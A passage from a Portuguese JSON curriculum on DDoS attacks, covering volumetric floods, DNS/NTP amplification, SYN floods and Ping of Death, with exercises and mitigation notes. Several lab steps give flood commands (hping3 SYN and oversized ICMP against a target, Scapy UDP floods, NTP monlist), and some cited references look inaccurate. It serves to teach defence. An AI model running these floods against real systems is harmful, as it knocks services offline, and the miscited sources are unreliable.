                                    "Achar que TCP é comum em volumétricos (é mais para protocol attacks)",
                                    "Subestimar o papel do volume vs qualidade do tráfego"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o mecanismo de exaustão de banda larga",
                                  "subSteps": [
                                    "Descreva o fluxo: botnets enviam tráfego de fontes distribuídas para amplificar volume.",
                                    "Calcule impacto: banda vítima < soma de banda atacantes leva a saturação upstream.",
                                    "Visualize com gráfico: curva de tráfego normal vs pico DDoS.",
                                    "Entenda amplificação: técnicas como DNS amplification para multiplicar volume.",
                                    "Simule mentalmente: teste com ferramenta online de simulação de rede."
                                  ],
                                  "verification": "Desenhe um diagrama simples mostrando fluxo de tráfego e ponto de saturação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Gráficos de ataques reais (ex: relatórios Cloudflare)",
                                    "Ferramentas online como packet generator simulators"
                                  ],
                                  "tips": "Foque na métrica bps (bits por segundo) como indicador chave de volumétrico.",
                                  "learningObjective": "Explicar como o volume de tráfego causa exaustão de recursos de rede.",
                                  "commonMistakes": [
                                    "Confundir exaustão de banda com exaustão de CPU/memória",
                                    "Ignorar reflexão/amplificação como booster de volume"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar ataques volumétricos de outros tipos de DDoS",
                                  "subSteps": [
                                    "Compare com Layer 7 (aplicação): volumétricos são Layer 3/4, focam rede não app.",
                                    "Distinga de protocol attacks: SYN/ACK floods esgotam conexões, não banda pura.",
                                    "Liste matriz comparativa: alvo (banda vs estado vs app), sofisticação (baixa vs alta).",
                                    "Analise logs simulados: identifique UDP flood vs HTTP flood.",
                                    "Pratique quiz: classifique 5 cenários como volumétrico ou não."
                                  ],
                                  "verification": "Crie uma tabela comparando 3 tipos de DDoS com pelo menos 3 critérios cada.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Tabela comparativa de tipos DDoS",
                                    "Logs de tráfego Wireshark de exemplos públicos"
                                  ],
                                  "tips": "Chave: volumétricos não precisam de estado/conexão; medidos em Gbps.",
                                  "learningObjective": "Diferenciar com precisão ataques volumétricos de protocol e application layer.",
                                  "commonMistakes": [
                                    "Classificar todos floods como volumétricos",
                                    "Misturar camadas OSI (L3/4 vs L7)"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise um log Wireshark de um ataque UDP flood: observe milhares de pacotes UDP de IPs spoofados para porta 53 (DNS), saturando 10Gbps de uplink, sem tentativas de conexão TCP, diferenciando de um SYN flood que teria flags SYN/ACK.",
                              "finalVerifications": [
                                "Liste corretamente 5 características principais de ataques volumétricos.",
                                "Identifique UDP/ICMP em um log de tráfego fornecido.",
                                "Explique em 1 minuto a diferença para um ataque de camada de aplicação.",
                                "Calcule impacto aproximado: 100Gbps flood em link de 1Gbps.",
                                "Classifique 3 cenários reais como volumétrico ou não.",
                                "Descreva mitigação básica: scrubbing centers para filtrar volume."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de protocolos stateless (UDP/ICMP).",
                                "Compreensão clara do foco em exaustão de banda vs outros recursos.",
                                "Capacidade de diferenciação de outros DDoS com exemplos.",
                                "Uso correto de terminologia (bps/Gbps, flood, amplificação).",
                                "Profundidade em sub-steps e verificações práticas.",
                                "Criatividade em analogias e aplicações reais."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos UDP/ICMP e modelo OSI camadas 3/4.",
                                "Matemática: Cálculos de volume de tráfego e amplificação (razões/multiplicadores).",
                                "Física: Analogia de fluxo de tráfego e capacidade de tubulações (banda).",
                                "Estatística: Análise de padrões em logs de tráfego e detecção de anomalias.",
                                "Ética: Discussão sobre impactos sociais de DDoS em infraestrutura crítica."
                              ],
                              "realWorldApplication": "Em uma empresa de e-commerce, identificar um pico de 50Gbps em UDP para portas aleatórias permite ativar BGP blackholing rapidamente, evitando downtime durante Black Friday, como no ataque de 2016 ao Dyn que derrubou Twitter e Netflix."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.1.2",
                            "name": "Listar e descrever exemplos comuns",
                            "description": "Enumerar e explicar exemplos como UDP Flood (envio massivo de pacotes UDP para portas aleatórias, gerando respostas desnecessárias) e ICMP Flood (bombardeio de pacotes ping), incluindo impactos reais como o ataque ao Dyn DNS em 2016.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de Ataques DDoS Volumétricos",
                                  "subSteps": [
                                    "Defina o que são ataques DDoS volumétricos: sobrecarga de largura de banda com tráfego massivo falso.",
                                    "Diferencie de outros tipos de DDoS (ex.: aplicação ou protocolo).",
                                    "Identifique o objetivo principal: esgotar recursos de rede da vítima.",
                                    "Revise métricas chave: volume de tráfego em Gbps, duração e fontes distribuídas.",
                                    "Estude o papel de botnets em amplificação de volume."
                                  ],
                                  "verification": "Crie um diagrama simples mostrando fluxo de tráfego volumétrico e explique verbalmente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Slides ou vídeo introdutório sobre DDoS (ex.: Cloudflare Learning Center)",
                                    "Papel e caneta para diagrama"
                                  ],
                                  "tips": "Use analogias como 'enchente de água entupindo canos' para visualizar sobrecarga.",
                                  "learningObjective": "Compreender o mecanismo base que permite listagem precisa de exemplos volumétricos.",
                                  "commonMistakes": "Confundir volumétricos com ataques de exaustão de estado (ex.: SYN flood)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descrever em Detalhe o UDP Flood",
                                  "subSteps": [
                                    "Explique o funcionamento: envio massivo de pacotes UDP para portas aleatórias na vítima.",
                                    "Descreva a resposta da vítima: geração de ICMP 'Port Unreachable' para cada pacote, amplificando tráfego.",
                                    "Calcule impacto: baixa taxa de falsificação UDP facilita ataques de baixa sofisticação.",
                                    "Liste ferramentas comuns: hping3, Scapy para simulação.",
                                    "Analise métricas: pode atingir terabits por segundo com botnets."
                                  ],
                                  "verification": "Escreva um parágrafo descrevendo o ataque e simule um pacote UDP falso usando Wireshark.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Wireshark (ferramenta gratuita)",
                                    "Tutorial Scapy para UDP flood simulado em lab"
                                  ],
                                  "tips": "Capture tráfego real de rede para ver pacotes UDP normais vs. flood.",
                                  "learningObjective": "Dominar descrição técnica precisa do UDP Flood como exemplo clássico.",
                                  "commonMistakes": "Ignorar que UDP é sem conexão, facilitando spoofing de IP."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Descrever em Detalhe o ICMP Flood (Ping Flood)",
                                  "subSteps": [
                                    "Defina ICMP Flood: bombardeio de pacotes Echo Request (ping) com spoofing de IP.",
                                    "Explique resposta: vítima responde com Echo Reply, dobrando tráfego de ida e volta.",
                                    "Discuta limitações: firewalls bloqueiam ICMP, mas ainda efetivo em redes desprotegidas.",
                                    "Compare com Smurf Attack: amplificação via broadcast.",
                                    "Revise defesas: rate limiting em roteadores."
                                  ],
                                  "verification": "Registre 5 características únicas do ICMP Flood em uma tabela comparativa com UDP Flood.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Documentação RFC 792 sobre ICMP",
                                    "Ferramenta ping em terminal para teste controlado"
                                  ],
                                  "tips": "Teste ping flood leve em localhost para sentir o impacto (use --flood no Linux).",
                                  "learningObjective": "Explicar mecanismos e impactos do ICMP Flood com precisão.",
                                  "commonMistakes": "Confundir com ping of death (exploit de buffer overflow, não volumétrico)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Outros Exemplos e Impactos Reais",
                                  "subSteps": [
                                    "Liste outros: DNS Amplification, NTP Amplification, SSDP Reflection.",
                                    "Descreva brevemente cada um: ex. DNS usa queries pequenas para respostas grandes.",
                                    "Estude caso real: Ataque Dyn DNS 2016 (Mirai botnet, 1.2 Tbps, derrubou Twitter/Netflix).",
                                    "Analise impactos: downtime econômico, perda de confiança.",
                                    "Sintetize lista completa: UDP, ICMP, DNS, NTP, com descrições curtas."
                                  ],
                                  "verification": "Crie uma tabela com 5 exemplos, descrições e impactos, incluindo referência ao Dyn 2016.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Relatório Krebs on Security sobre Mirai/Dyn",
                                    "Lista OWASP de DDoS volumétricos"
                                  ],
                                  "tips": "Pesquise 'DDoS case studies' para vídeos visuais de ataques reais.",
                                  "learningObjective": "Listar e contextualizar múltiplos exemplos com casos históricos.",
                                  "commonMistakes": "Focar só em teoria sem ligar a eventos reais como Dyn."
                                }
                              ],
                              "practicalExample": "Em um lab virtual com VirtualBox, configure duas VMs (atacante e vítima). Use Scapy na atacante para enviar 10.000 pacotes UDP/segundo para portas aleatórias na vítima. Monitore com Wireshark na vítima: observe sobrecarga de CPU/rede e ICMP replies, simulando UDP Flood real.",
                              "finalVerifications": [
                                "Liste verbalmente 5 exemplos comuns de DDoS volumétricos com uma frase descritiva cada.",
                                "Explique mecanismo de amplificação em UDP e ICMP Floods.",
                                "Descreva impacto do ataque Dyn 2016 e lições aprendidas.",
                                "Crie diagrama de fluxo para um exemplo escolhido.",
                                "Diferencie volumétricos de outros DDoS em quiz de 10 perguntas.",
                                "Simule captura de tráfego flood em Wireshark."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica nas descrições (sem erros conceituais).",
                                "Completude da lista (mínimo 5 exemplos com detalhes).",
                                "Uso de exemplos reais e impactos quantificados (ex.: Tbps).",
                                "Clareza na explicação de mecanismos (spoofing, respostas).",
                                "Capacidade de diferenciação entre tipos de ataques.",
                                "Integração de defesas básicas em descrições."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos UDP/ICMP e captura de pacotes.",
                                "Programação: Scripts em Python/Scapy para simulação de ataques.",
                                "Matemática: Cálculo de amplificação (fatores de multiplicação de tráfego).",
                                "História/Economia: Impacto de ciberataques em infraestrutura crítica.",
                                "Ética: Discussão legalidade e responsabilidade em testes de segurança."
                              ],
                              "realWorldApplication": "Em uma SOC (Security Operations Center), analise logs de firewall para detectar picos de UDP/ICMP de IPs spoofados, permitindo mitigação rápida via blackholing ou scrubbers, prevenindo downtime em serviços como e-commerce durante picos de tráfego."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.1.3",
                            "name": "Explicar mecanismos de amplificação",
                            "description": "Descrever técnicas de amplificação, como DNS Amplification ou NTP Amplification, onde respostas maiores que as requisições são geradas, multiplicando o volume de tráfego com poucos recursos do atacante.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais de Amplificação em DDoS",
                                  "subSteps": [
                                    "Defina o que é um ataque de amplificação: uma técnica onde pequenas requisições geram respostas muito maiores.",
                                    "Explique o papel do spoofing de IP: o atacante falsifica o endereço IP da vítima nas requisições.",
                                    "Identifique o fator de amplificação: razão entre o tamanho da resposta e da requisição (ex: 50x ou mais).",
                                    "Discuta por que protocolos UDP são preferidos: sem handshake, permitindo respostas diretas.",
                                    "Revise exemplos genéricos de protocolos vulneráveis como DNS, NTP e SSDP."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo o conceito e o fator de amplificação, confirmando compreensão básica.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação RFC 6891 sobre reflexão/amplificação",
                                    "Vídeo introdutório sobre DDoS no YouTube (Cloudflare)"
                                  ],
                                  "tips": "Use diagramas simples para visualizar o fluxo: Atacante -> Servidor Amplificador -> Vítima.",
                                  "learningObjective": "Entender os princípios básicos que permitem a multiplicação de tráfego em ataques volumétricos.",
                                  "commonMistakes": "Confundir amplificação com reflexão; amplificação foca no tamanho da resposta, reflexão no redirecionamento."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Mecanismo de Amplificação DNS",
                                  "subSteps": [
                                    "Descreva o protocolo DNS: consultas recursivas ou ANY que retornam grandes respostas.",
                                    "Explique o processo: Atacante envia consulta DNS spoofada para servidor DNS aberto.",
                                    "Calcule fator de amplificação típico: até 50x, pois respostas incluem múltiplos registros.",
                                    "Simule com ferramenta: Use dig ou nslookup para testar consultas ANY em servidores públicos.",
                                    "Identifique vulnerabilidades: Servidores DNS recursivos abertos sem autenticação."
                                  ],
                                  "verification": "Execute uma consulta DNS ANY e compare tamanhos de requisição/resposta usando Wireshark.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta Wireshark",
                                    "Comando 'dig @servidor.example.com ANY example.com'"
                                  ],
                                  "tips": "Filtre pacotes UDP porta 53 no Wireshark para isolar tráfego DNS.",
                                  "learningObjective": "Dominar como o DNS é explorado para amplificar tráfego em DDoS.",
                                  "commonMistakes": "Ignorar Rate Limiting; servidores modernos limitam consultas ANY."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o Mecanismo de Amplificação NTP",
                                  "subSteps": [
                                    "Apresente o protocolo NTP: usado para sincronização de tempo, com comandos como 'monlist'.",
                                    "Detalhe o fluxo: Spoofed 'monlist' retorna lista de até 600 clientes recentes (amplificação ~200x).",
                                    "Compare com DNS: NTP expõe mais dados de clientes, aumentando volume.",
                                    "Teste em ambiente controlado: Configure servidor NTP vulnerável localmente com ntpd.",
                                    "Note patches: Comandos monlist depreciados pós-2014, mas legados persistem."
                                  ],
                                  "verification": "Desenhe um diagrama do fluxo NTP monlist e liste o fator de amplificação.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação NTP.org sobre monlist",
                                    "Docker image para ntpd vulnerável"
                                  ],
                                  "tips": "Use 'ntpdc -n -c monlist' em servidor NTP para simular resposta amplificada.",
                                  "learningObjective": "Compreender especificidades do NTP como vetor de amplificação.",
                                  "commonMistakes": "Assumir todos NTP são vulneráveis; foque em versões antigas sem 'noquery'."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e Comparar Mecanismos de Amplificação",
                                  "subSteps": [
                                    "Compare DNS vs NTP: Fatores (50x vs 200x), portas (53 vs 123), comandos explorados.",
                                    "Discuta impacto geral: Consumo de banda da vítima excede capacidade.",
                                    "Explore mitigação básica: BCP38 (ingress filtering), firewalls bloqueando UDP spoofed.",
                                    "Crie tabela comparativa: Protocolo, Fator, Vulnerabilidade, Exemplo real.",
                                    "Reflita sobre evolução: Novos vetores como Memcached (50k x)."
                                  ],
                                  "verification": "Crie e apresente uma tabela comparativa de pelo menos 3 protocolos amplificadores.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Tabela modelo em Google Sheets",
                                    "Relatório Cloudflare DDoS Threat Report"
                                  ],
                                  "tips": "Inclua métricas reais de ataques passados para contextualizar.",
                                  "learningObjective": "Integrar conhecimentos para explicar e comparar múltiplos mecanismos.",
                                  "commonMistakes": "Focar só em teoria; sempre ancorar em exemplos mensuráveis."
                                }
                              ],
                              "practicalExample": "Em um ataque simulado, um botnet de 100 máquinas envia 60-byte DNS queries spoofadas para 1000 servidores DNS abertos. Cada resposta de 3000 bytes atinge a vítima, resultando em 300MB/s de tráfego com apenas 6MB/s de esforço do atacante (fator 50x). Use Wireshark para capturar e medir.",
                              "finalVerifications": [
                                "Pode calcular precisamente o fator de amplificação para DNS e NTP?",
                                "Descreve corretamente o papel do spoofing de IP em ambos os mecanismos?",
                                "Identifica pelo menos 3 protocolos amplificadores adicionais?",
                                "Explica por que UDP é essencial para esses ataques?",
                                "Lista 2 mitigação por protocolo?",
                                "Simula um fluxo básico em diagrama?"
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: Explicações sem erros conceituais (40%)",
                                "Detalhe nos exemplos: Inclusão de fatores numéricos e fluxos (30%)",
                                "Comparação clara: Tabela ou lista diferenciando mecanismos (15%)",
                                "Aplicação prática: Demonstração via ferramenta ou simulação (10%)",
                                "Clareza de comunicação: Linguagem acessível e estruturada (5%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos UDP/DNS/NTP e spoofing",
                                "Matemática: Cálculo de fatores de amplificação e escalas exponenciais",
                                "Programação: Scripts para simulação de pacotes (Scapy em Python)",
                                "Ética e Direito: Implicações legais de ataques DDoS",
                                "Física: Analogia com amplificadores de sinal em ondas"
                              ],
                              "realWorldApplication": "Profissionais de cibersegurança usam esse conhecimento para configurar firewalls que bloqueiam tráfego amplificado (ex: AWS Shield detecta DNS/NTP floods), analisar logs de incidentes como o ataque GitHub de 2018 (1.3Tbps via Memcached, similar), e educar equipes sobre hardening de servidores públicos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.2.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.2.2",
                        "name": "Ataques DDoS de Protocolo",
                        "description": "Ataques que exploram fraquezas nos protocolos de rede de camadas inferiores (TCP/IP), consumindo recursos de processamento como memória e CPU em roteadores, firewalls ou servidores, sem necessariamente gerar alto volume de tráfego.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.2.2.1",
                            "name": "Caracterizar ataques de protocolo",
                            "description": "Explicar que esses ataques mantêm o tráfego em níveis moderados, mas forçam o esgotamento de estados de conexão ou processamento de pacotes malformados, como half-open connections no TCP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos dos Ataques DDoS e Tipos de Protocolo",
                                  "subSteps": [
                                    "Estude a definição de ataques DDoS e sua evolução para distribuídos.",
                                    "Classifique os tipos de DDoS: volumétricos, de camada de aplicação e de protocolo.",
                                    "Identifique que ataques de protocolo exploram vulnerabilidades nos protocolos de rede, como TCP/IP.",
                                    "Analise como eles evitam detecção por manterem tráfego moderado.",
                                    "Revise o stack TCP/IP para contextualizar pontos de exploração."
                                  ],
                                  "verification": "Resuma em um diagrama as diferenças entre os três tipos de DDoS, destacando o foco em recursos de estado para protocol attacks.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação RFC 793 (TCP)",
                                    "Vídeo introdutório sobre DDoS no YouTube/Khan Academy",
                                    "Ferramenta de desenho como Draw.io"
                                  ],
                                  "tips": "Use analogias como 'fila de banco' para estados de conexão esgotados.",
                                  "learningObjective": "Diferenciar ataques DDoS de protocolo dos outros tipos e entender seu mecanismo de evasão.",
                                  "commonMistakes": "Confundir tráfego moderado com baixo volume, ignorando o impacto em processamento."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Conceito de Estados de Conexão e Half-Open Connections",
                                  "subSteps": [
                                    "Descreva o handshake TCP de 3 vias (SYN, SYN-ACK, ACK).",
                                    "Explique half-open connections: envio de SYN sem completar o handshake.",
                                    "Calcule o impacto: quantos half-open states uma tabela de conexões suporta (ex: 65k no Linux padrão).",
                                    "Simule conceitualmente o esgotamento da tabela de estados com múltiplos IPs spoofados.",
                                    "Discuta limites de recursos: CPU e memória para manter estados."
                                  ],
                                  "verification": "Desenhe o fluxo de um half-open connection e calcule quantos SYN floods esgotariam 10k conexões em 1 minuto.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Wireshark para captura de pacotes TCP",
                                    "Simulador TCP como ns-3 ou Cisco Packet Tracer",
                                    "Artigo sobre SYN cookies"
                                  ],
                                  "tips": "Monitore contadores de conexões no netstat durante simulações.",
                                  "learningObjective": "Dominar como half-open connections esgotam recursos de estado no TCP.",
                                  "commonMistakes": "Achar que spoofing de IP é desnecessário; é crucial para DDoS distribuído."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Pacotes Malformados e Outros Exemplos de Ataques de Protocolo",
                                  "subSteps": [
                                    "Estude pacotes malformados: fragmentos IP inválidos, opções TCP anormais.",
                                    "Exemplo: Ping of Death (pacotes ICMP oversized) e suas defesas modernas.",
                                    "Descreva ataques como Slowloris (manter conexões abertas minimamente).",
                                    "Compare processamento forçado: CPU para validar pacotes vs. bandwidth flood.",
                                    "Liste defesas: SYN cookies, rate limiting, firewalls stateful."
                                  ],
                                  "verification": "Identifique 3 exemplos de pacotes malformados e explique por que forçam processamento intensivo.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Lista de CVEs relacionados a protocol attacks (ex: CVE-1996-XXXX)",
                                    "Ferramenta hping3 para gerar pacotes malformados em lab isolado",
                                    "Documentação Cloudflare sobre DDoS"
                                  ],
                                  "tips": "Teste em VM isolada para evitar riscos reais.",
                                  "learningObjective": "Caracterizar ataques via pacotes malformados e suas implicações em processamento.",
                                  "commonMistakes": "Subestimar defesas modernas como SYN proxy, achando ataques obsoletos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Características Gerais dos Ataques de Protocolo",
                                  "subSteps": [
                                    "Compile traços chave: tráfego moderado, foco em estado/processamento, difícil detecção.",
                                    "Compare métricas: pps (packets per second) baixo vs. Gbps em volumétricos.",
                                    "Crie um perfil de detecção: anomalias em half-open ratios, CPU spikes sem bandwidth.",
                                    "Discuta escalabilidade com botnets para distribuição.",
                                    "Avalie impactos: downtime sem alertas de volume."
                                  ],
                                  "verification": "Escreva um parágrafo caracterizando um ataque de protocolo, distinguindo de outros DDoS.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Relatórios de incidentes DDoS (ex: Akamai State of Internet)",
                                    "Planilha para tabelas comparativas"
                                  ],
                                  "tips": "Use métricas quantitativas para reforçar 'moderado' (ex: <1Mpps).",
                                  "learningObjective": "Sintetizar e caracterizar ataques de protocolo de forma holística.",
                                  "commonMistakes": "Generalizar todos DDoS como high-volume, ignorando sutileza de protocol attacks."
                                }
                              ],
                              "practicalExample": "Em um laboratório com Wireshark e hping3, gere 1000 SYN floods por segundo de múltiplos IPs spoofados contra um servidor Apache em VM. Monitore netstat para half-open states crescendo até falha de novas conexões legítimas, mantendo tráfego <10Mbps.",
                              "finalVerifications": [
                                "Explique por que protocol attacks usam tráfego moderado.",
                                "Liste 3 exemplos de esgotamento de estado (ex: TCP SYN, UDP flood reflection).",
                                "Descreva detecção via monitoramento de CPU sem pico de bandwidth.",
                                "Diferencie de application layer attacks.",
                                "Identifique defesas como SYN cookies.",
                                "Calcule impacto de 1k half-open em tabela de 64k conexões."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de tipos DDoS (80%+ correto).",
                                "Profundidade em exemplos como half-open TCP (detalhes de handshake).",
                                "Uso de evidências quantitativas (tempos, limites de recursos).",
                                "Capacidade de síntese em caracterização clara e concisa.",
                                "Aplicação prática em lab ou simulação demonstrada.",
                                "Identificação de 2+ erros comuns evitados."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Handshake TCP/IP e estados FSM.",
                                "Programação: Scripts Python com Scapy para packet crafting.",
                                "Matemática: Modelos de filas M/M/1 para esgotamento de recursos.",
                                "Ética em TI: Discussão de impactos legais de simulações DDoS."
                              ],
                              "realWorldApplication": "Em 2016, o ataque Dyn DNS usou protocol floods mistos para derrubar sites como Twitter; profissionais de SOC usam essas caracterizações para configurar IDS/IPS como Snort rules detectando SYN flood ratios elevados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.2.2",
                            "name": "Analisar exemplos clássicos",
                            "description": "Detalhar SYN Flood (envio de SYN sem ACK, enchendo a tabela de conexões semi-abertas) e Ping of Death (pacotes ICMP oversized que causam buffer overflow), com referências históricas como o ataque de 1996.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o mecanismo do SYN Flood",
                                  "subSteps": [
                                    "Ler a definição técnica: SYN Flood envolve o envio massivo de pacotes SYN sem ACK subsequente, esgotando a tabela de conexões semi-abertas do servidor TCP.",
                                    "Estudar o handshake TCP de 3 vias (SYN, SYN-ACK, ACK) e identificar onde o SYN Flood interrompe.",
                                    "Identificar componentes: spoofing de IP, falta de ACK, impacto na fila de conexões (backlog queue).",
                                    "Analisar diagramas de fluxo de pacotes SYN Flood usando ferramentas como Wireshark.",
                                    "Pesquisar estatísticas: tabela de conexões pode ter limite de 1024-4096 entradas em sistemas antigos."
                                  ],
                                  "verification": "Explicar verbalmente ou por escrito o ciclo de vida de uma conexão SYN Flood interrompida, desenhando um diagrama simples.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação RFC 793 (TCP)",
                                    "Wireshark instalado",
                                    "Artigos sobre TCP backlog",
                                    "Vídeos tutoriais sobre handshake TCP"
                                  ],
                                  "tips": "Use analogia de fila de banco: clientes enviam bilhete (SYN) mas não chegam para atendimento (sem ACK).",
                                  "learningObjective": "Dominar o mecanismo técnico do SYN Flood e seu impacto na pilha TCP/IP.",
                                  "commonMistakes": [
                                    "Confundir SYN Flood com outros floods como UDP",
                                    "Ignorar o papel do spoofing de IP",
                                    "Subestimar o limite da fila de conexões"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Ping of Death e buffer overflow",
                                  "subSteps": [
                                    "Definir Ping of Death: pacotes ICMP Echo Request oversized (>65.535 bytes) fragmentados que causam overflow no reassembly buffer.",
                                    "Estudar protocolo ICMP: estrutura de pacotes ping (Echo Request/Reply) e fragmentação IP.",
                                    "Explicar o exploit: ao remontar fragmentos, buffer excede limite, causando crash ou DoS.",
                                    "Visualizar com exemplos de código ou capturas: pacotes malformados em hex dump.",
                                    "Testar em ambiente controlado: usar hping3 para gerar pacotes oversized em VM vulnerável."
                                  ],
                                  "verification": "Gerar um pacote oversized simulado e descrever o processo de reassembly que leva ao overflow.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ferramenta hping3 ou Scapy",
                                    "VM com Windows 95/NT simulado ou vulnerable machine",
                                    "RFC 792 (ICMP)",
                                    "Wireshark para captura"
                                  ],
                                  "tips": "Lembre-se: IPv4 permite fragmentos; IPv6 mitiga isso nativamente.",
                                  "learningObjective": "Entender como fragmentação IP e ICMP levam a vulnerabilidades de buffer em SOs antigos.",
                                  "commonMistakes": [
                                    "Confundir com Smurf attack (amplificação broadcast)",
                                    "Ignorar necessidade de fragmentação para oversized",
                                    "Não diferenciar ICMP de TCP/UDP floods"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Investigar contexto histórico e impactos",
                                  "subSteps": [
                                    "Pesquisar SYN Flood: primeiro documentado em 1994-1996, afetou sites como Panix.com em 1996.",
                                    "Estudar Ping of Death: explorado em 1996, crashou Windows 95/NT, Linux kernels antigos; patched em dezembro 1996.",
                                    "Analisar impactos: downtime de servidores, perda financeira, aceleração de patches em SOs.",
                                    "Coletar referências: CERT advisories (CA-1996-01 para Ping, CA-1996-21 para SYN), notícias da época.",
                                    "Mapear evolução: de DoS local para precursor de DDoS distribuídos."
                                  ],
                                  "verification": "Criar timeline cronológica com datas, vítimas e patches para ambos ataques.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "CERT Vulnerability Notes archive",
                                    "Artigos históricos (e.g., Wired 1996)",
                                    "Livros como 'Hacking Exposed'"
                                  ],
                                  "tips": "Use Google Scholar para papers acadêmicos de 1996-1998 sobre esses ataques.",
                                  "learningObjective": "Conectar mecanismos técnicos a eventos históricos reais na cibersegurança.",
                                  "commonMistakes": [
                                    "Datas erradas (ambos 1996, mas SYN ligeiramente antes)",
                                    "Confundir com ataques posteriores como Code Red",
                                    "Subestimar legado em modern SYN proxies"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar ataques, mitigações e síntese",
                                  "subSteps": [
                                    "Comparar: SYN Flood (Layer 4 TCP stateful) vs Ping of Death (Layer 3 ICMP stateless oversized).",
                                    "Listar mitigações: SYN cookies/proxies para SYN; IP defrag checks, firewalls stateful para Ping.",
                                    "Sintetizar similaridades: ambos DoS clássicos de protocolo, exploram implementações frágeis.",
                                    "Discutir relevância atual: SYN ainda usado em DDoS amplificados; Ping obsoleto mas lição para parsing.",
                                    "Criar tabela comparativa: mecanismo, layer, história, mitigações."
                                  ],
                                  "verification": "Apresentar tabela comparativa e propor uma mitigação híbrida para ambos.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramentas como iptables para simular mitigações",
                                    "Documentação SYN cookies (RFC 4987)"
                                  ],
                                  "tips": "Pense em camadas OSI: SYN L4, Ping L3/ICMP.",
                                  "learningObjective": "Integrar conhecimentos para análise comparativa e aplicação prática.",
                                  "commonMistakes": [
                                    "Ignorar diferenças de estado (stateful vs stateless)",
                                    "Achar Ping irrelevante hoje (lições persistem)",
                                    "Não mencionar botnets modernas para SYN"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório com Kali Linux e uma VM Windows Server 2000 vulnerável, capture tráfego Wireshark enquanto executa 'hping3 --syn -p 80 -S -i u1 target_ip' para SYN Flood e 'hping3 --icmp --data 60000 target_ip' para Ping of Death simulado, observando crashes e tabelas de conexão cheias via netstat.",
                              "finalVerifications": [
                                "Explicar handshake TCP interrompido no SYN Flood com diagrama.",
                                "Descrever reassembly ICMP levando a buffer overflow no Ping of Death.",
                                "Citar eventos de 1996: Panix SYN Flood e CERT advisory para Ping.",
                                "Listar 3 mitigações por ataque.",
                                "Comparar impactos históricos vs atuais.",
                                "Simular um ataque em lab e mitigar."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica nos mecanismos (TCP/ICMP).",
                                "Correção de fatos históricos (datas, vítimas).",
                                "Profundidade em substeps e verificações.",
                                "Criatividade em analogias e exemplos práticos.",
                                "Compreensão de mitigações e evolução para DDoS.",
                                "Clareza na tabela comparativa."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Handshake TCP e fragmentação IP.",
                                "História da Computação: Evolução de vulnerabilidades 1990s.",
